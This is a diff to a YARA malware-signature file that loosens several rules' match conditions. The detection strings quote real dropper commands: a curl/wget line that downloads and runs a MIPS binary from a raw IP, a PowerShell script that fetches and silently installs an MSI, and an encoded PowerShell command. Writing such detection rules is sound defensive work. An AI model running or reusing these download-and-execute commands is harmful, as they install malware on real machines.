@@ -18375,7 +18375,7 @@ rule STRRAT_signature__7ece07ec {
       $s5 = "ar i=0; i<this.toString().length; i++){d = eval(\"var cd = this.toString().substr(i, 1);cd;\") + d;}return d;}}.mp3;" fullword ascii /* score: '8.00'*/
    condition:
       uint16(0) == 0x7453 and filesize < 3000KB and
-      all of them
+      3 of ($s*)
 }
 
 rule STRRAT_signature__2 {
@@ -23337,7 +23337,7 @@ rule sig_033036c8e1e40d53c90f93a224265cb798c58bf5d48f9e7160a540c958f5b3ad_033036
       $s3 = "powershell -wind mi -Enc LgAgACgAZwBhAGwAIAB3AGcAPwA/ACkAIAAtAHUAcwBlAGIAIABoAHQAdABwAHMAOgAvAC8AYQBuAGcAZQBsAGEAaQByAHMALgBjAG8" ascii /* score: '9.00'*/
    condition:
       uint16(0) == 0x6f70 and filesize < 1KB and
-      all of them
+      2 of ($s*)
 }
 
 rule sig_03fa7fb2ba9d530afdd0deb7d19496ea34950ed3a0800558f3695d2b5dc34329_03fa7fb2 {
@@ -24770,13 +24770,13 @@ rule sig_7eceff81d7ba3b8a12d93221b1f564d8835b339669a382800f47df159159e17d_7eceff
       date = "2025-09-26"
       hash1 = "7eceff81d7ba3b8a12d93221b1f564d8835b339669a382800f47df159159e17d"
    strings:
-      $s1 = "                <value>rm -rf morte.mips; curl --output morte.mips http://193.32.162.27/00101010101001/morte.mips; wget http://1" ascii /* score: '19.00'*/
-      $s2 = "                <value>rm -rf morte.mips; curl --output morte.mips http://193.32.162.27/00101010101001/morte.mips; wget http://1" ascii /* score: '16.00'*/
+      $s1 = "<value>rm -rf morte.mips; curl --output morte.mips http://193.32.162.27/00101010101001/morte.mips; wget http://1" ascii /* score: '19.00'*/
+      $s2 = "<value>rm -rf morte.mips; curl --output morte.mips http://193.32.162.27/00101010101001/morte.mips; wget http://1" ascii /* score: '16.00'*/
       $s3 = "<beans xmlns=\"http://www.springframework.org/schema/beans\"" fullword ascii /* score: '13.00'*/
       $s4 = "93.32.162.27/00101010101001/morte.mips; chmod 777 morte.mips; ./morte.mips morte.mips;</value>" fullword ascii /* score: '12.00'*/
    condition:
       uint16(0) == 0x623c and filesize < 2KB and
-      all of them
+      3 of ($s*)
 }
 
 rule sig_453ffaa4b93d44f9fdec327e92740ba2b9ed6e080df9b6c0834a79c8fa34e9f7_453ffaa4 {
@@ -26911,7 +26911,7 @@ rule sig_24d7520206452bbe32986b7d5347150ad2e33acdee1ab622dbe53d91d96ae88e_24d752
       $s15 = "nngkfonwkzveliguafxswqnrzgjrdwixgoxkkahiftwoexyrjnzcjbnrvydeumgftcixcomwwpmtegxxmghrqvqhgywdjlzurkeymelpbpfiicetfholzvnbmaodkkxd" ascii /* score: '14.00'*/
    condition:
       uint16(0) == 0xfeff and filesize < 2000KB and
-      1 of ($x*) and all of them
+      3 of ($x*) and 8 of ($s*)
 }
 
 rule sig_3659ac46a884e4e2774c9c6f3230f65af5c517d365ee16cffd50027d1d725f83_3659ac46 {
@@ -26987,7 +26987,7 @@ rule sig_45843c4aba63cba8c3c23aeb702550269ee704371ce687c94d4440149fba598c_45843c
       $s7 = "del llIlIllllIlllIll.txt" fullword ascii /* score: '11.00'*/
    condition:
       uint16(0) == 0x6540 and filesize < 2KB and
-      all of them
+      5 of ($s*)
 }
 
 rule sig_5533c4c461fe08f8ff000d14998f590f52d840be2263ccaa100ab49a4ae51f5e_5533c4c4 {
@@ -27496,13 +27496,12 @@ rule sig_37e96cc01fcf657c68d05cb1814e63eaa46582c21a23edec1a8e5d6d81257f9c_37e96c
    strings:
       $x1 = "(New-Object -ComObject shell.application).MinimizeAll(); Invoke-Command -ScriptBlock { param($p1 <# , #> , $p2 <# , #> , $p3); $" ascii /* score: '55.00'*/
       $s2 = "ebRequest -Uri $p1 -OutFile $fileName; Start-Process -Wait -FilePath msiexec -ArgumentList '/i',$fileName,'/qn','LicenseAccepted" ascii /* score: '29.00'*/
-      $s3 = "(New-Object -ComObject shell.application).MinimizeAll(); Invoke-Command -ScriptBlock { param($p1 <# , #> , $p2 <# , #> , $p3); $" ascii /* score: '27.00'*/
-      $s4 = "=YES',\"POLICY_CATEGORY_ID=$p2\",\"INSTALL_ARGS=$p3\",\"/L*V\",'installation.log' } -ArgumentList 'https://rihby.com/node5.digit" ascii /* score: '22.00'*/
-      $s5 = "n.com/app/','-1','url=https://rihby.com/node5.digitalocean.com/app/'" fullword ascii /* score: '17.00'*/
-      $s6 = "fileName = Split-Path -Path $p1 -Leaf; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-W" ascii /* score: '11.00'*/
+      $s3 = "=YES',\"POLICY_CATEGORY_ID=$p2\",\"INSTALL_ARGS=$p3\",\"/L*V\",'installation.log' } -ArgumentList 'https://rihby.com/node5.digit" ascii /* score: '22.00'*/
+      $s4 = "n.com/app/','-1','url=https://rihby.com/node5.digitalocean.com/app/'" fullword ascii /* score: '17.00'*/
+      $s5 = "fileName = Split-Path -Path $p1 -Leaf; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-W" ascii /* score: '11.00'*/
    condition:
       uint16(0) == 0x4e28 and filesize < 1KB and
-      1 of ($x*) and all of them
+      1 of ($x*) and 2 of ($s*)
 }
 
 rule sig_3913b5412de2af6aa07d2048b01cfd8cb29b1648b98c03cc047fbc0e6174a8a3_3913b541 {
@@ -27900,7 +27899,7 @@ rule sig_5ba851a46be6fec695c68a3c1facceeaee9248b7fea4d058229adec568e2a987_5ba851
       $s3 = "s://ctrlcapaserc.com/bomla'))\"" fullword ascii /* score: '10.00'*/
    condition:
       uint16(0) == 0x6f70 and filesize < 1KB and
-      1 of ($x*) and all of them
+      1 of ($x*) and $s3
 }
 
 rule sig_6161fea5a04008961449d46fc34d0d0fcf90172d14f17ab0e331ee9b115d5cfd_6161fea5 {
